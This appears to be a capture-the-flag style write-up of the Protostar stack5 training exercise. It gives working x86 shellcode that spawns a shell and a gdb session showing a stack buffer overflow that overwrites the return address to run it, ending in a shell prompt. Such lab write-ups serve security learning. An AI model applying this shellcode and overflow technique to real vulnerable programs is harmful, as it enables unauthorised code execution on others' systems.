## protostar-stack5

ret address overwrite to execute shellcode

shellcode :
55bytes
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

## http://exploit-exercises.com/protostar/stack5



```sh
login as: user


    PPPP  RRRR   OOO  TTTTT  OOO   SSSS TTTTT   A   RRRR
    P   P R   R O   O   T   O   O S       T    A A  R   R
    PPPP  RRRR  O   O   T   O   O  SSS    T   AAAAA RRRR
    P     R  R  O   O   T   O   O     S   T   A   A R  R
    P     R   R  OOO    T    OOO  SSSS    T   A   A R   R

          http://exploit-exercises.com/protostar                                                                                                                          

Welcome to Protostar. To log in, you may use the user / user account.
When you need to use the root account, you can login as root / godmode.

For level descriptions / further help, please see the above url.

user@192.168.48.128's password:
Linux (none) 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Apr 10 10:40:39 2013 from 192.168.48.1
$ python -c 'print ("\x41" * 76) + "\xcc\xcc\xcc\xcc" +("\x90" * 16)+("\x42" *120)'>/tmp/patt                                                                                      0)' >/tmp/patt
$ gdb /opt/protostar/bin/stack5
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) run < /tmp/patt
Starting program: /opt/protostar/bin/stack5 < /tmp/patt

Program received signal SIGSEGV, Segmentation fault.
0xcccccccc in ?? ()
(gdb) x/32x $esp
0xbffffcf0:     0x90909090      0x90909090      0x90909090      0x90909090----------------------->we find our shellcode buffer  address 0xbffffcf0
0xbffffd00:     0xdb31c031      0x80cd06b0      0x742f6853      0x2f687974
0xbffffd10:     0x89766564      0x66c931e3      0xb02712b9      0x3180cd05
0xbffffd20:     0x2f6850c0      0x6868732f      0x6e69622f      0x5350e389
0xbffffd30:     0xb099e189      0x9080cd0b      0x90909090      0x90909090
0xbffffd40:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffd50:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffd60:     0x90909090      0x90909090      0x00000090      0x08048331
(gdb) q
A debugging session is active.

        Inferior 1 [process 2925] will be killed.

Quit anyway? (y or n) y
$ python -c 'print ("\x41" * 76)+ "\xec\xfc\xff\xbf" +("\x90" * 16)+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+ ("\x90" * 50)' >/tmp/aa2
$ ^C
$  gdb /opt/protostar/bin/stack5
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) run < /tmp/aa2
Starting program: /opt/protostar/bin/stack5 < /tmp/aa2
Executing new program: /bin/dash
$ id
uid=1001(user) gid=1001(user) groups=1001(user)
$ ps
  PID TTY          TIME CMD
 2907 pts/0    00:00:00 sh
 2950 pts/0    00:00:00 gdb
 2952 pts/0    00:00:00 sh
 2956 pts/0    00:00:00 ps
$ q

```
